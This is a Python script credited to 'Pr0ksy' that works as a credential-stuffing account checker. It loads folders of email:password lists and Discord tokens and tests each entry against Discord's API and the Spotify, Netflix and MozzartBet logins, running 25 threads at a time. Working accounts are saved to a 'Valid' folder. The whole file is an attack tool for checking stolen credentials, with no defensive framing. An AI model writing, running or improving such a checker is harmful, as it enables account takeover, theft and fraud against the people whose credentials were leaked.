import os
import requests
import tkinter as tk
from tkinter import filedialog
from concurrent.futures import ThreadPoolExecutor

print("By Pr0ksy")

def check_discord_token(token):
    url = "https://discord.com/api/v9/users/@me"
    headers = {"Authorization": token.strip()}
    response = requests.get(url, headers=headers)
    return response.status_code == 200

def check_spotify(email, password):
    url = "https://accounts.spotify.com/api/login"
    data = {"username": email, "password": password}
    response = requests.post(url, data=data)
    return response.status_code == 200

def check_netflix(email, password):
    url = "https://www.netflix.com/login"
    data = {"userLoginId": email, "password": password}
    response = requests.post(url, data=data)
    return response.status_code == 200

def check_mozzartbet(email, password):
    url = "https://www.mozzartbet.com/sr/login"
    data = {"username": email, "password": password}
    response = requests.post(url, data=data)
    return response.status_code == 200

def check_account(site, account):
    account = account.strip()
    if site == "DiscordTokens":
        return check_discord_token(account)
    elif site == "spotify":
        email, password = account.split(":")
        return check_spotify(email, password)
    elif site == "netflix":
        email, password = account.split(":")
        return check_netflix(email, password)
    elif site == "mozzartbet":
        email, password = account.split(":")
        return check_mozzartbet(email, password)
    return False

def process_file(file_path, site):
    valid_accounts = []
    invalid_accounts = []
    
    with open(file_path, "r", encoding="utf-8") as f:
        accounts = f.readlines()
    
    with ThreadPoolExecutor(max_workers=25) as executor:
        results = list(executor.map(lambda acc: (acc, check_account(site, acc)), accounts))
    
    for account, is_valid in results:
        if is_valid:
            valid_accounts.append(account)
        else:
            invalid_accounts.append(account)
    
    os.makedirs("Checked/Valid", exist_ok=True)
    os.makedirs("Checked/Invalid", exist_ok=True)
    
    if valid_accounts:
        with open(f"Checked/Valid/Checked_{site}.txt", "w", encoding="utf-8") as f:
            f.writelines(valid_accounts)
    
    if invalid_accounts:
        with open(f"Checked/Invalid/Checked_{site}.txt", "w", encoding="utf-8") as f:
            f.writelines(invalid_accounts)

def main():
    root = tk.Tk()
    root.withdraw()
    selected_folder = filedialog.askdirectory(title="Select folder with sorted accounts")
    
    if not selected_folder:
        print("❌ No folder selected. Exiting...")
        return
    
    files = os.listdir(selected_folder)
    if not files:
        print("❌ No files found in the selected folder.")
        return
    
    print("Checking accounts...")
    for file in files:
        site = file.replace(".txt", "")
        process_file(os.path.join(selected_folder, file), site)
    
    print("✅ Checking completed! Results saved in Checked folder.")

if __name__ == "__main__":
    main()

